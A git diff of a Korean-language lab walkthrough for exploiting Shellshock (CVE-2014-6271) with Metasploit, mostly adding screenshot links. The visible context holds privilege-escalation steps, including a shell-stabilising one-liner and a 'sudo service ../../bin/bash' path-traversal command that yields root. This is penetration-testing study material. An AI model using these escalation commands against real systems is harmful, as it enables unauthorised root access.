@@ -1,4 +1,14 @@
-### 💥 10. Metasploit — Shellshock 공격 (CVE-2014-6271)
+### thor
+
+<img width="349" height="498" alt="Image" src="https://github.com/user-attachments/assets/999d0bf6-b983-4e41-a7c7-5d7ab5c60212" />
+
+<img width="378" height="165" alt="Image" src="https://github.com/user-attachments/assets/ab3b3225-7f79-499f-9ff3-a98c849d74ce" />
+
+<img width="929" height="778" alt="Image" src="https://github.com/user-attachments/assets/e70b7066-98f4-4af1-9f82-e561fc3cdd5d" />
+
+---
+
+### 💥 Metasploit — Shellshock 공격 (CVE-2014-6271)
 
 ---
 
@@ -61,6 +71,9 @@ SHELL=/bin/bash script -q /dev/null
 # → 안정적인 bash 쉘 획득
 ```
 
+<img width="424" height="158" alt="Image" src="https://github.com/user-attachments/assets/c7c8333a-528e-404f-ad6a-5566b52db016" />
+
+
 ---
 
 #### 👤 Step 4. thor 계정 확인 & 권한 상승
@@ -78,6 +91,8 @@ Please enter your Secret massage : # bash 입력 후 엔터
 # → thor 권한의 bash 쉘 획득
 ```
 
+<img width="838" height="738" alt="Image" src="https://github.com/user-attachments/assets/33527c49-13a5-4ec9-8d97-c7cea08e4dfb" />
+
 ---
 
 #### 👑 Step 5. root 권한 상승
@@ -93,6 +108,9 @@ sudo service ../../bin/bash
 
 whoami    # root
 cd /root
+```
+
+<img width="923" height="827" alt="Image" src="https://github.com/user-attachments/assets/c352e713-0d86-4b2b-9571-e6c74c1a1fdc" />
 ls        # proof.txt 확인!
 ```
 
